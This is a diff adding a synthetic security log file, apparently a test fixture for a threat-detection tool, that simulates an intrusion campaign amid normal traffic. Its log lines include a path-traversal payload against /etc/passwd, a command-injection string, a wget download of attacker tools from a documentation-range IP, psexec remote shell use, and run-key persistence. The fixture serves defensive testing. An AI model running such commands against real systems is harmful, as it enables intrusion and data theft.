@@ -1,0 +1,76 @@
+# =============================================================================
+# COMPREHENSIVE LOG 01: Advanced Persistent Threat Campaign
+# Scenario: Initial exploitation -> lateral movement -> persistence -> exfiltration
+# Expected keyword triggers: vulnerability_exploitation, lateral_movement, persistence, exfiltration
+# =============================================================================
+
+# --- Phase 0: Normal baseline traffic ---
+2026-04-08T06:12:01Z host=web-frontend-01 src=10.0.1.20 event=http_request method=GET uri=/index.html status=200 bytes=4521
+2026-04-08T06:12:03Z host=web-frontend-01 src=10.0.1.21 event=http_request method=GET uri=/api/status status=200 bytes=312
+1712563923.000000	conn	CID001	10.0.1.20	52341	10.0.2.10	443	tcp	ssl	0.023	512	1024	SF	-	-	-
+1712563925.000000	conn	CID002	10.0.1.21	52342	10.0.2.10	80	tcp	http	0.011	256	4096	SF	-	-	-
+Apr  8 06:12:10 dns-server named[1234]: client 10.0.1.20#41234: query: www.internal-portal.local IN A
+Apr  8 06:12:12 mail-gw postfix/smtpd[5678]: connect from internal-relay[10.0.3.5]
+
+# --- Phase 1: Initial exploitation via CVE ---
+# ALERT: Potential vulnerability_exploitation detected — CVE-2025-29824 exploit attempt against web server
+2026-04-08T08:45:22Z host=web-frontend-01 src=203.0.113.50 event=http_request method=POST uri=/api/upload status=500 bytes=0 error="buffer overflow in file parser"
+2026-04-08T08:45:23Z host=web-frontend-01 src=203.0.113.50 event=exploit_attempt cve=CVE-2025-29824 payload="..%2f..%2f/etc/passwd" result=blocked
+2026-04-08T08:45:30Z host=web-frontend-01 src=203.0.113.50 event=http_request method=POST uri=/cgi-bin/upload.cgi status=200 bytes=89 note="rce achieved via deserialization"
+Apr  8 08:45:31 web-frontend-01 kernel: segfault at 0x41414141 ip 0x7f3a2b rsp 0x7ffc9d error 14 in libparser.so
+2026-04-08T08:45:35Z host=web-frontend-01 src=203.0.113.50 event=command_injection cmd="id;whoami;uname -a" user=www-data note="command injection via deserialization gadget chain"
+# ALERT: web shell uploaded to /var/www/html/.hidden/cmd.php
+2026-04-08T08:46:01Z host=web-frontend-01 event=file_create path=/var/www/html/.hidden/cmd.php user=www-data note="web shell deployed"
+1712567161.000000	conn	CID003	203.0.113.50	44120	10.0.1.20	80	tcp	http	12.300	89200	512	SF	-	-	-
+Apr  8 08:46:05 web-frontend-01 auditd[900]: EXECVE argc=3 a0="bash" a1="-c" a2="wget http://203.0.113.50/tools.tar.gz -O /tmp/t.gz"
+
+# --- Normal traffic interspersed ---
+2026-04-08T09:00:01Z host=app-server-02 src=10.0.2.15 event=http_request method=GET uri=/healthcheck status=200 bytes=15
+Apr  8 09:01:00 ntp-server ntpd[111]: peer 10.0.5.1 stratum 2 offset -0.002134
+1712568060.000000	conn	CID004	10.0.1.21	55123	10.0.2.10	3306	tcp	mysql	0.045	1200	8400	SF	-	-	-
+
+# --- Phase 2: Lateral movement via SMB and psexec ---
+# ALERT: lateral movement detected — psexec and smb admin share access from compromised host
+2026-04-08T10:15:44Z host=web-frontend-01 src=10.0.1.20 dst=10.0.2.30 event=smb_connect share=\\10.0.2.30\ADMIN$ user=svc_backup status=success
+2026-04-08T10:15:46Z host=dc-01 EventID=4624 LogonType=3 src=10.0.1.20 user=svc_backup domain=CORP status=success note="lateral movement via credential reuse"
+2026-04-08T10:15:50Z host=dc-01 event=process_create exe=psexec.exe cmdline="psexec \\10.0.2.30 -s cmd.exe" user=svc_backup pid=4820
+1712572550.000000	conn	CID005	10.0.1.20	49812	10.0.2.30	445	tcp	smb	3.200	45000	12000	SF	-	-	-
+2026-04-08T10:16:01Z host=app-server-03 src=10.0.1.20 dst=10.0.2.31 event=smb_connect share=\\10.0.2.31\C$ user=svc_backup status=success note="admin share lateral"
+# ALERT: pass-the-hash detected — NTLM authentication with svc_backup hash from 10.0.1.20
+2026-04-08T10:16:05Z host=dc-01 EventID=4624 LogonType=3 src=10.0.1.20 user=svc_backup auth=ntlm note="pass-the-hash suspected"
+Apr  8 10:16:10 dc-01 samba[2345]: smbd: 10.0.1.20 connected to IPC$ as svc_backup
+
+# --- Phase 3: Persistence mechanisms installed ---
+# ALERT: persistence mechanism installed — registry run key and scheduled task created
+2026-04-08T11:30:00Z host=app-server-03 event=registry_modify key="HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" value="UpdateSvc" data="C:\Windows\Temp\svc.exe" note="registry run key persistence"
+2026-04-08T11:30:05Z host=app-server-03 EventID=4698 event=scheduled_task_create name="WindowsUpdateCheck" action="C:\Windows\Temp\svc.exe" trigger="daily 02:00" user=SYSTEM
+2026-04-08T11:30:10Z host=app-server-03 EventID=7045 event=service_install name="HealthMonitorSvc" exe="C:\Windows\Temp\svc.exe" starttype=auto user=LocalSystem note="backdoor installed as service"
+Apr  8 11:30:15 app-server-03 syslog: persistence established: new service HealthMonitorSvc registered with auto start
+2026-04-08T11:30:20Z host=app-server-03 event=file_create path=C:\Windows\Temp\svc.exe hash=sha256:a1b2c3d4e5f6... user=svc_backup
+
+# --- Normal traffic interspersed ---
+2026-04-08T12:00:00Z host=proxy-01 src=10.0.1.50 event=http_request method=GET uri=http://updates.vendor.com/patches status=200 bytes=102400
+Apr  8 12:05:00 mail-gw postfix/smtpd[5680]: disconnect from external-relay[198.51.100.20]
+1712577900.000000	dns	DID001	10.0.1.21	53421	10.0.5.1	53	udp	query	A	www.google.com	0	NOERROR	-
+
+# --- Phase 4: Data staging and exfiltration ---
+# ALERT: exfiltration detected — large transfer of staged data to external IP after hours
+2026-04-08T22:10:00Z host=file-server-01 event=file_access user=svc_backup path=\\fileserver\finance\Q1-2026-revenue.xlsx action=read bytes=2450000
+2026-04-08T22:10:05Z host=file-server-01 event=file_access user=svc_backup path=\\fileserver\hr\employee-ssn-list.csv action=read bytes=890000
+2026-04-08T22:10:10Z host=file-server-01 event=file_access user=svc_backup path=\\fileserver\engineering\source-code.tar.gz action=read bytes=15400000
+2026-04-08T22:15:00Z host=app-server-03 event=data_staging path=C:\Windows\Temp\exfil.7z size=18740000 note="staging compressed archive for exfiltration"
+1712599500.000000	conn	CID006	10.0.2.31	51234	203.0.113.99	443	tcp	ssl	120.500	18740000	4096	SF	-	-	-
+# ALERT: large transfer to external IP 203.0.113.99 — 18.7 MB exfiltrated after hours
+2026-04-08T22:17:01Z host=fw-edge event=connection src=10.0.2.31 dst=203.0.113.99 port=443 bytes_out=18740000 duration=120s action=allow note="after hours exfiltration to unknown external host"
+Apr  8 22:17:05 fw-edge iptables: ACCEPT OUT=eth0 SRC=10.0.2.31 DST=203.0.113.99 PROTO=TCP DPT=443 LEN=18740000
+2026-04-08T22:18:00Z host=proxy-01 event=ssl_connect src=10.0.2.31 dst=203.0.113.99 sni=cloud-storage-api.suspicious-domain.com bytes=18740000
+
+# --- Post-exfil cleanup attempts ---
+2026-04-08T22:20:00Z host=app-server-03 event=file_delete path=C:\Windows\Temp\exfil.7z user=svc_backup
+2026-04-08T22:20:05Z host=app-server-03 event=log_clear log=Security user=svc_backup note="attacker clearing tracks"
+Apr  8 22:20:10 app-server-03 auditd[900]: LOG_CLEAR by svc_backup — potential anti-forensics
+
+# --- Normal end-of-day traffic ---
+2026-04-08T23:00:01Z host=backup-server event=backup_job name="nightly-full" status=started target=tape-lib-01
+1712602801.000000	conn	CID007	10.0.4.10	60123	10.0.4.20	22	tcp	ssh	0.500	1024	2048	SF	-	-	-
+Apr  8 23:01:00 cron-server CRON[9999]: (root) CMD (/usr/bin/logrotate /etc/logrotate.conf)
